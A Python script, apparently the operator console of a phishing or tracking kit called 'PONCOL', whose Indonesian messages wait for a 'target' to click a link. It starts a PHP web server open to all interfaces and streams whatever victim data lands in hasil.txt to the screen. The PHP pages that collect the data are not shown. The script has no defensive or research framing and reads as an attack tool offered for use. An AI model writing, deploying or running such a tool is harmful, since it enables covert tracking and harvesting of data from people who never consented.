import os, subprocess, time

def show():
    os.system('clear')
    print('\033[1;31m')
    print(r"""
    ____  ____  _   ___________  __ 
   / __ \/ __ \/ | / / ____/ __ \/ / 
  / /_/ / / / /  |/ / /   / / / / /  
 / ____/ /_/ / /|  / /___/ /_/ / /___
/_/    \____/_/ |_/\____/\____/_____/
                                         
    [ V1.0 - HIGH ACCURACY TRACKER ]
    """)
    print('\033[1;37mAuthor: \033[1;31mPONCOL \033[1;37m| Status: \033[1;32mONLINE\033[0m')
    print('\033[1;31m' + '='*45 + '\033[0m')

def run():
    subprocess.Popen(["php", "-S", "0.0.0.0:8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print('\033[1;32m[+]\033[0m Server PHP: \033[1;32mACTIVE\033[0m')
    print('\033[1;32m[+]\033[0m Menunggu Target Mengklik Link...')
    print('\033[1;31m' + '-'*45 + '\033[0m')
    last_pos = 0
    while True:
        if os.path.exists("hasil.txt"):
            with open("hasil.txt", "r") as f:
                f.seek(last_pos)
                content = f.read()
                if content:
                    print('\n\033[1;36m[!!!] TARGET TERDETEKSI - DATA MASUK [!!!]\033[0m')
                    print('\033[1;32m' + content + '\033[0m')
                    print('\033[1;31m' + '-'*45 + '\033[0m')
                    last_pos = f.tell()
        time.sleep(2)

if __name__ == "__main__":
    try:
        show()
        run()
    except KeyboardInterrupt:
        os.system("pkill php")
        print("\n\033[1;31m[!] Sistem PONCOL Dimatikan.\033[0m")
